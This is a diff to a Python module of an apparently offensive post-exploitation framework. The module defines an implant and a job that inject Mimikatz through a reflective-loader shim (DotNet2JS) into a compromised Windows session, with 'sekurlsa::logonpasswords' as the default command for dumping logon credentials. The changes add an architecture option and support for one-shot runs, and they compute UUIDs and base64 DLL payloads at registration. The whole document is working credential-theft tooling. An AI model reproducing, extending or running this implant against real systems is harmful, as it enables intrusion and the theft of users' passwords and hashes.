@@ -5,6 +5,20 @@ import string
 
 class DotNet2JSJob(core.job.Job):
     def create(self):
+        arch = self.options.get("ARCH")
+        if self.session_id == -1:
+            if arch == 'auto':
+                self.error("0", "Job requires a defined ARCH when used with a ONESHOT. Set ARCH for this job and try again.", "Arch not defined", "")
+                return False
+            elif arch == '64':
+                self.script = self.script.replace(b"~SHIMB64~", self.options.get("SHIMX64B64").encode())
+                self.script = self.script.replace(b"~SHIMOFFSET~", self.options.get("SHIMX64OFFSET").encode())
+            elif arch == '32':
+                self.script = self.script.replace(b"~SHIMB64~", self.options.get("SHIMX86B64").encode())
+                self.script = self.script.replace(b"~SHIMOFFSET~", self.options.get("SHIMX86OFFSET").encode())
+            self.errstat = 0
+            return
+
         self.mimi_output = ""
         if self.session.elevated != 1 and self.options.get("IGNOREADMIN") == "false":
             self.error("0", "This job requires an elevated session. Set IGNOREADMIN to true to run anyway.", "Not elevated", "")
@@ -12,12 +26,21 @@ class DotNet2JSJob(core.job.Job):
 
         # cant change this earlier, has to be job specific
         # i dont like it, but this is how we do this to make payload smaller
-        if self.session.arch == "64":
+        if arch == 'auto':
+            if self.session.arch == "64":
+                self.script = self.script.replace(b"~SHIMB64~", self.options.get("SHIMX64B64").encode())
+                self.script = self.script.replace(b"~SHIMOFFSET~", self.options.get("SHIMX64OFFSET").encode())
+            else:
+                self.script = self.script.replace(b"~SHIMB64~", self.options.get("SHIMX86B64").encode())
+                self.script = self.script.replace(b"~SHIMOFFSET~", self.options.get("SHIMX86OFFSET").encode())
+        elif arch == '64':
             self.script = self.script.replace(b"~SHIMB64~", self.options.get("SHIMX64B64").encode())
             self.script = self.script.replace(b"~SHIMOFFSET~", self.options.get("SHIMX64OFFSET").encode())
-        else:
+        elif arch == '32':
             self.script = self.script.replace(b"~SHIMB64~", self.options.get("SHIMX86B64").encode())
             self.script = self.script.replace(b"~SHIMOFFSET~", self.options.get("SHIMX86OFFSET").encode())
+
+
         self.errstat = 0
 
     def parse_mimikatz(self, data):
@@ -82,6 +105,8 @@ class DotNet2JSImplant(core.implant.Implant):
 
         self.options.register("MIMICMD", "sekurlsa::logonpasswords", "What Mimikatz command to run?", required=True)
 
+        self.options.register("ARCH", "auto", "Architecture of the target computer (auto, 64, 32)", advanced=True, enum=['auto', '64', '32'])
+
         self.options.register("SHIMX86DLL", "data/bin/mimishim.dll", "relative path to mimishim.dll", required=True, advanced=True)
         self.options.register("SHIMX64DLL", "data/bin/mimishim.x64.dll", "relative path to mimishim.x64.dll", required=True, advanced=True)
         self.options.register("MIMIX86DLL", "data/bin/powerkatz32.dll", "relative path to powerkatz32.dll", required=True, advanced=True)
@@ -89,12 +114,13 @@ class DotNet2JSImplant(core.implant.Implant):
 
         self.options.register("UUIDHEADER", "ETag", "HTTP header for UUID", advanced=True)
 
-        self.options.register("SHIMX64UUID", "", "UUID", hidden=True)
-        self.options.register("MIMIX64UUID", "", "UUID", hidden=True)
-        self.options.register("MIMIX86UUID", "", "UUID", hidden=True)
+        import uuid
+        self.options.register("SHIMX64UUID", uuid.uuid4().hex, "UUID", hidden=True)
+        self.options.register("MIMIX64UUID", uuid.uuid4().hex, "UUID", hidden=True)
+        self.options.register("MIMIX86UUID", uuid.uuid4().hex, "UUID", hidden=True)
 
-        self.options.register("SHIMX86B64", "", "calculated bytes for arr_DLL", hidden=True)
-        self.options.register("SHIMX64B64", "", "calculated bytes for arr_DLL", hidden=True)
+        self.options.register("SHIMX86B64", self.dllb64(self.options.get("SHIMX86DLL")), "calculated bytes for arr_DLL", hidden=True)
+        self.options.register("SHIMX64B64", self.dllb64(self.options.get("SHIMX64DLL")), "calculated bytes for arr_DLL", hidden=True)
 
         self.options.register("SHIMX86OFFSET", "6202", "Offset to the reflective loader", advanced = True)
         self.options.register("SHIMX64OFFSET", "7620", "Offset to the reflective loader", advanced = True)
@@ -102,6 +128,8 @@ class DotNet2JSImplant(core.implant.Implant):
         # self.options.register("SHIMB64", "", "calculated bytes for arr_DLL", advanced = True)
         # self.options.register("SHIMOFFSET", "", "Offset to the reflective loader", advanced = True)
 
+    def job(self):
+        return DotNet2JSJob
 
     def dllb64(self, path):
         import base64
@@ -120,18 +148,9 @@ class DotNet2JSImplant(core.implant.Implant):
 
     def run(self):
 
-        import uuid
-        self.options.set("DLLUUID", uuid.uuid4().hex)
-        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
-        self.options.set("SHIMX64UUID", uuid.uuid4().hex)
-        self.options.set("MIMIX64UUID", uuid.uuid4().hex)
-        self.options.set("MIMIX86UUID", uuid.uuid4().hex)
-
-        self.options.set("SHIMX86B64", self.dllb64(self.options.get("SHIMX86DLL")))
-        self.options.set("SHIMX64B64", self.dllb64(self.options.get("SHIMX64DLL")))
         self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
 
         workloads = {}
         workloads["js"] = self.loader.load_script("data/implant/inject/mimikatz_dotnet2js.js", self.options)
 
-        self.dispatch(workloads, DotNet2JSJob)
+        self.dispatch(workloads, self.job)
